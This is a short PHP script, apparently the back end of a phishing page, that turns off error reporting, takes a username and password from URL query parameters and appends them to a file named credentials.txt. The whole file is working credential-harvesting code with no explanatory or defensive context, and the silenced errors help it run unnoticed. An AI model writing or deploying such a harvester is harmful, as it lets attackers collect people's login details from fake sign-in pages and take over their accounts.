<?php

    error_reporting(0);

    $user = $_GET["user"];
    $pass = $_GET["pass"];
    
    $file = fopen("credentials.txt", "a+");
    fwrite($file, $user . ", " . $pass . "\n");
    fclose($file);
        
?>